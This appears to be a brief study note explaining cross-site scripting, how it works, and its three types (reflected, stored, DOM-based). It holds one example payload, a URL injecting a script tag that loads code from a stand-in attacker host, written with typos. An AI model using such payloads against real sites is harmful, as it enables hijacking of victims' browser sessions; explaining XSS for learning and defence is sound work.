# cross site scripting

XSS vulnerabilities target scripts embedded in a page that are executed on the client-side (in the user’s web browser) rather than on the server-side.

### How XSS Works ?

Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. 

```html
https://site.com?cmt?msg=<script src=htts://hacker.com/badscript.js></script>
```

**Types Of XSS attacks**

1. Reflected xss
2. Stored xss
3. DOM-based xss


